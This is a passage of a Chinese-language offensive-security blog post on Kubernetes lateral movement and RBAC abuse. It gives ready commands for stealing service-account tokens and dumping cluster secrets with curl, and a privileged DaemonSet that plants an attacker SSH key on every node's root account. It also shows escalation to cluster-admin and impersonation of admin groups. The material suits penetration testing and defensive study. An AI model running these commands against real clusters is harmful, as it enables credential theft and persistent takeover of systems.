+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><h4 id="常用攻击利用方式"><strong>常用攻击利用方式</strong><a hidden class="anchor" aria-hidden="true" href="#常用攻击利用方式">#</a></h4>
+<p><strong>未授权或Web漏洞</strong></p>
+<ol>
+<li>寻找中间件,微服务,数据库等进行弱口令测试</li>
+<li>pod是web应用就可以测试web漏洞</li>
+<li>SSRF,利用存在SSRF的Pod攻击其他Pod</li>
+</ol>
+<p><strong>基于API横向</strong></p>
+<p>查看pod的身份凭证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/var/run/secrets/kubernetes.io/serviceaccount/token
+</span></span></code></pre></div><p>通过token构造请求向API Server（默认地址为 <code>https://kubernetes.default.svc</code>）发起请求。</p>
+<p><strong>基于RABC横向</strong></p>
+<p>如果当前 Pod 的 ServiceAccount 拥有以下特定权限，即可实现横向移动</p>
+<ol>
+<li>
+<p>拥有 <code>pods/exec</code> 权限:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 使用 curl 或 kubectl 连载目标 Pod</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it &lt;target-pod-name&gt; -n &lt;target-namespace&gt; -- /bin/bash
+</span></span></code></pre></div></li>
+<li>
+<p>拥有 <code>pods/create</code> 权限:可以创建一个Pod 获得宿主机权限”或“通过 Pod 内部网络进行渗透”。</p>
+</li>
+<li>
+<p>拥有 <code>secrets</code> 观察权限（<code>get/list/watch</code>）: 扩大供给面</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#可以直接通过 API Server 的 REST 接口拉取整个 Namespace 下的所有 Secret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. 设置环境变量（Token 从 /var/run/secrets/... 中读取）</span>
+</span></span><span style="display:flex;"><span>TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>APISERVER<span style="color:#f92672">=</span>https://kubernetes.default.svc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 列出目标命名空间的所有 Secret</span>
+</span></span><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> $APISERVER/api/v1/namespaces/default/secrets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3.获取其详细内容</span>
+</span></span><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> $APISERVER/api/v1/namespaces/default/secrets/db-creds
+</span></span></code></pre></div></li>
+</ol>
+<h2 id="2-rbac滥用">2. RBAC滥用<a hidden class="anchor" aria-hidden="true" href="#2-rbac滥用">#</a></h2>
+<h4 id="滥用创建权限create">滥用创建权限(create)<a hidden class="anchor" aria-hidden="true" href="#滥用创建权限create">#</a></h4>
+<p>如果当前 Token 拥有对集群资源的 <code>create</code> 权限，攻击者可以通过创建恶意资源实现大范围的横向移动,如:<code>pods</code>,<code>deployments</code>,<code>daemonsets</code>,<code>statefulsets</code>）</p>
+<p><strong>利用 DaemonSet 进行全节点横向</strong></p>
+<p><strong>原理:</strong> DaemonSet 的特性是会在集群中的每一个 Node（节点）上都自动运行一个 Pod 副本。所以在 DaemonSet 的 Spec 中配置特权模式并挂载宿主机根目录部署将同时在集群内的所有节点上获得一个特权后门</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">DaemonSet</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">cluster-wide-backdoor</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">backdoor</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">backdoor</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">hostPID</span>: <span style="color:#66d9ef">true</span> <span style="color:#75715e"># 共享宿主机 PID</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">alpine</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">alpine</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;echo &#39;恶意公钥&#39; &gt;&gt; /mnt/host/root/.ssh/authorized_keys &amp;&amp; sleep 3600&#34;</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">host-root</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt/host</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">host-root</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><h4 id="滥用远程执行权限">滥用远程执行权限<a hidden class="anchor" aria-hidden="true" href="#滥用远程执行权限">#</a></h4>
+<p>(pods/exec<code>或</code>pods/ephemeralcontainers<code> </code>create/update)</p>
+<ol>
+<li>
+<p>pods/exec</p>
+<p>攻击者可以先通过 API Server 列出（List）当前命名空间或全集群的所有 Pod，然后进入核心业务Pod,如 <code>mysql</code>、<code>redis</code>、<code>payment</code>、<code>auth</code>，直接 <code>exec</code> 进去劫持其业务流量。</p>
+</li>
+<li>
+<p>pods/ephemeralcontainers</p>
+<p>新版K8s中为了安全去除了<code>bash/sh</code>但如果拥有 <code>pods/ephemeralcontainers</code> 的 <code>update</code> 权限可以向正在运行的敏感 Pod 中<strong>动态注入</strong>一个带有完整工具链（如 Ubuntu/Alpine）的临时容器，并共享目标容器的命名空间</p>
+</li>
+</ol>
+<h4 id="滥用凭据查看权限">滥用凭据查看权限<a hidden class="anchor" aria-hidden="true" href="#滥用凭据查看权限">#</a></h4>
+<p><strong>漏洞原因</strong>:权限允许 <code>get</code> 或 <code>list</code> 敏感的 <code>secrets</code></p>
+<p>寻找属于 <code>admin</code>、<code>kube-system</code> 或第三方高权限组件（如 Helm、ArgoCD、Jenkins）的 Token。拿到这些 Token 后，攻击者在本地攻击机上配置 <code>kubeconfig</code>，直接以更高身份接管集群</p>
+<h4 id="滥用绑定和越权">滥用绑定和越权<a hidden class="anchor" aria-hidden="true" href="#滥用绑定和越权">#</a></h4>
+<p><code>rolebindings</code> / <code>clusterrolebindings</code> `create/update</p>
+<p>拥有 <code>clusterrolebindings/create</code> 权限。</p>
+<p>创建一个新的 <code>ClusterRoleBinding</code>，将系统自带的角色 <code>cluster-admin</code> 绑定到自己当前的低权限 ServiceAccount 上,命令示例</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl create clusterrolebinding pwned-admin <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --clusterrole<span style="color:#f92672">=</span>cluster-admin <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --serviceaccount<span style="color:#f92672">=</span>default:current-low-priv-sa
+</span></span></code></pre></div><h4 id="滥用用户伪装">滥用用户伪装<a hidden class="anchor" aria-hidden="true" href="#滥用用户伪装">#</a></h4>
+<p>允许一个用户以另一个用户或组的身份去执行请求. 原本是用于管理员排查问题</p>
+<p><strong>漏洞原因</strong>: RBAC 中，<code>verbs</code> 包含 <code>impersonate</code></p>
+<p>当Token拥有对<code>Users</code>或<code>groups</code>的的 <code>impersonate</code> 权限,可以通过构造api请求,借用管理员的权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 假装自己是系统内置的 admin</span>
+</span></span><span style="display:flex;"><span>kubectl get pods --as<span style="color:#f92672">=</span>system:admin
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者假装自己属于顶级管理员组</span>
+</span></span><span style="display:flex;"><span>kubectl get secrets --as-group<span style="color:#f92672">=</span>system:masters
+</span></span></code></pre></div><h4 id="快速确认token权限">快速确认Token权限<a hidden class="anchor" aria-hidden="true" href="#快速确认token权限">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. 检查当前身份在当前 Namespace 拥有哪些核心权限</span>
+</span></span><span style="display:flex;"><span>kubectl auth can-i --list
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 盲测是否具备某些高危横向能力（返回 yes/no）</span>
+</span></span><span style="display:flex;"><span>kubectl auth can-i create pods
+</span></span><span style="display:flex;"><span>kubectl auth can-i create daemonsets --all-namespaces
+</span></span><span style="display:flex;"><span>kubectl auth can-i list secrets --all-namespaces
+</span></span><span style="display:flex;"><span>kubectl auth can-i create pods/exec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 自动化工具</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 使用 rakkess 工具可以枚举出权限</span>
+</span></span><span style="display:flex;"><span>rakkess --token<span style="color:#f92672">=</span>&lt;TOKEN&gt;
+</span></span></code></pre></div><h2 id="3-node-to-node">3. node-to-node<a hidden class="anchor" aria-hidden="true" href="#3-node-to-node">#</a></h2>
+<h2></h2>
+<p>部分参考文章</p>
+<pre tabindex="0"><code>https://github.com/neargle/re0-kubernetes-sec-archive
+https://wiki.teamssix.com/CloudNative/Kubernetes/k8s-horizontal-taints.html
+https://www.anquanke.com/post/id/250959
+https://blog.imoe.tech/2023/06/16/user-impersonation-in-kubernetes/
+</code></pre>
 
   </div>
 
